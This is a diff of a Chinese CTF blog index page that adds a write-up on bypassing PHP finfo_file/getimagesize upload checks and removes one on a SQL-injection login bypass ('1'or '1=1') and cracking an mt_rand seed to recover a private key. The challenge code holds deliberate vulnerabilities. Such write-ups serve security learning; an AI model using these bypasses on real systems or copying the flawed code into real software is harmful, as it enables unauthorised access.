@@ -172,6 +172,75 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-finfo_open函数和finfo_file函数绕过以及getimagesize函数绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/27/finfo_open%E5%87%BD%E6%95%B0%E5%92%8Cfinfo_file%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Agetimagesize%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/" class="article-date">
+  	<time datetime="2021-10-26T16:00:00.000Z" itemprop="datePublished">2021-10-27</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/27/finfo_open%E5%87%BD%E6%95%B0%E5%92%8Cfinfo_file%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Agetimagesize%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/">
+        finfo_open函数和finfo_file函数绕过以及getimagesize函数绕过
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="finfo-open函数和finfo-file函数绕过以及getimagesize函数绕过"><a href="#finfo-open函数和finfo-file函数绕过以及getimagesize函数绕过" class="headerlink" title="finfo_open函数和finfo_file函数绕过以及getimagesize函数绕过"></a>finfo_open函数和finfo_file函数绕过以及getimagesize函数绕过</h1><h2 id="finfo-open和finfo-file"><a href="#finfo-open和finfo-file" class="headerlink" title="finfo_open和finfo_file"></a>finfo_open和finfo_file</h2><p>finfo_open()是创建一个fileinfo资源的，而finfo_file()是返回一个文件信息的，而一般它们两个函数结合着用。如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE); //创建资源类型</span><br><span class="line">$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]); //返回文件的类型</span><br></pre></td></tr></table></figure>
+
+<h2 id="getimagesiza"><a href="#getimagesiza" class="headerlink" title="getimagesiza()"></a>getimagesiza()</h2><p>getimagesiza()函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回false，其中返回数组的信息的含义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">索引 0 给出的是图像宽度的像素值</span><br><span class="line"></span><br><span class="line">索引 1 给出的是图像高度的像素值</span><br><span class="line"></span><br><span class="line">索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</span><br><span class="line"></span><br><span class="line">索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image&gt; 标签</span><br><span class="line"></span><br><span class="line">索引 bits 给出的是图像的每种颜色的位数，二进制格式</span><br><span class="line"></span><br><span class="line">索引 channels 给出的是图像的通道值，RGB 图像默认是 3</span><br><span class="line"></span><br><span class="line">索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如：header(&quot;Content-type: image/jpeg&quot;);</span><br></pre></td></tr></table></figure>
+<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>我们可以得到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">require_once(&#x27;config.php&#x27;);</span><br><span class="line">require_once(&#x27;lib/util.php&#x27;);</span><br><span class="line">require_once(&#x27;lib/session.php&#x27;);</span><br><span class="line"></span><br><span class="line">$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);</span><br><span class="line"></span><br><span class="line">// check whether file is uploaded</span><br><span class="line">if (!file_exists($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]) || !is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;])) &#123;</span><br><span class="line">  error(&#x27;No file was uploaded.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file size</span><br><span class="line">if ($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt; 256000) &#123;</span><br><span class="line">  error(&#x27;Uploaded file is too large.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file type</span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line">if (!in_array($type, [&#x27;image/png&#x27;])) &#123;</span><br><span class="line">  error(&#x27;Uploaded file is not PNG format.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// check file width/height</span><br><span class="line">$size = getimagesize($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;</span><br><span class="line">  error(&#x27;Uploaded image is too large.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if ($size[2] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  // I hope this never happens...</span><br><span class="line">  error(&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27; . getenv(&#x27;FLAG1&#x27;) . &#x27;&lt;/code&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ok</span><br><span class="line">$filename = bin2hex(random_bytes(4)) . &#x27;.png&#x27;;</span><br><span class="line">move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_DIR . &#x27;/&#x27; . $filename);</span><br><span class="line"></span><br><span class="line">$session-&gt;set(&#x27;avatar&#x27;, $filename);</span><br><span class="line">flash(&#x27;info&#x27;, &#x27;Your avatar has been successfully updated!&#x27;);</span><br><span class="line">redirect(&#x27;/&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>通过审计源码，我们呢需要绕过一个if以及finfo_file()函数和getimagesize()函数，第一个if只要我们传小于256尺寸的图片即可，而对于finfo_file()函数，则是检测上传图片类型为image/png，同时getimagesize()则是在检查长宽时，会获取图像大小及相关信息，成功返回一个数组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 290</span><br><span class="line">    [1] =&gt; 69</span><br><span class="line">    [2] =&gt; 3</span><br><span class="line">    [3] =&gt; width=&quot;290&quot; height=&quot;69&quot;</span><br><span class="line">    [bits] =&gt; 8</span><br><span class="line">    [mime] =&gt; image/png</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>由上面可知索引0和1是文件的长和宽，而索引2为文件类型为png，但是只要我们只留png的文件头部，则会让getimagesize()报错，然后绕过它，带出flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-强网拟态部分web" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1021,84 +1090,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-伪随机数以及文件泄露" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/10/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" class="article-date">
-  	<time datetime="2021-10-13T16:00:00.000Z" itemprop="datePublished">2021-10-14</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/">
-        伪随机数以及文件泄露
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="伪随机数以及文件泄露"><a href="#伪随机数以及文件泄露" class="headerlink" title="伪随机数以及文件泄露"></a>伪随机数以及文件泄露</h1><p>打开页面，发现没有什么提示信息，所以用dirsearch去扫描，发现有文件泄露</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.zip</span><br></pre></td></tr></table></figure>
-<p>打开源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&#x27;Content-type:text/html; charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_POST[&#x27;login&#x27;]))&#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">    $Private_key = $_POST[&#x27;Private_key&#x27;];</span><br><span class="line">    if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123;</span><br><span class="line">        // 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    else if($Private_key != &#x27;*************&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if($Private_key === &#x27;************&#x27;)&#123;</span><br><span class="line">        $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; </span><br><span class="line">        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">        mysql_select_db(&quot;test&quot;,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">// genarate public_key </span><br><span class="line">function public_key($length = 16) &#123;</span><br><span class="line">    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $public_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //genarate private_key</span><br><span class="line">  function private_key($length = 12) &#123;</span><br><span class="line">    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $private_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></pre></td></tr></table></figure>
-<p>从源码中，我们发现一个登录界面</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&#x27;refresh:2; url=login.html&#x27;);</span><br></pre></td></tr></table></figure>
-<p>我们尝试构造/login.html，然后登录，发现它需要用户名，密码和私钥，而从源码中，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;</span><br></pre></td></tr></table></figure>
-<p>所以我们可以知道用户名为crispr，密码我们可以构造万能钥匙1’or ‘1=1绕过，而对于私钥，我们知道公钥是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Public_key = KVQP0LdJKRaV3n9D</span><br></pre></td></tr></table></figure>
-<p>所以我们可以使用爆破的方式获取种子，从而得到私钥</p>
-<p>首先我们要获取爆破种子的参数值，exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span><br><span class="line">key=&#x27;KVQP0LdJKRaV3n9D&#x27;</span><br><span class="line">m=&#x27;&#x27;</span><br><span class="line">for i in key:</span><br><span class="line">    for j in range(len(s)):</span><br><span class="line">        if i==s[j]:</span><br><span class="line">            m+=&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;.format(j,j,len(s)-1)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>
-<p>得到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure>
-<p>然后我们使用php_mt_seed来对种子进行爆破</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1775196155</span><br></pre></td></tr></table></figure>
-<p>然后我们就可以得到私钥，exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(1775196155);</span><br><span class="line">function public_key($length = 16) &#123;</span><br><span class="line">    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $public_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  //genarate private_key</span><br><span class="line">function private_key($length = 12) &#123;</span><br><span class="line">    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $private_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">echo public_key() . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo private_key();</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>得到私钥为XuNhoueCDCGc，然后登录即可得到flag</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
 	</div>
 
       
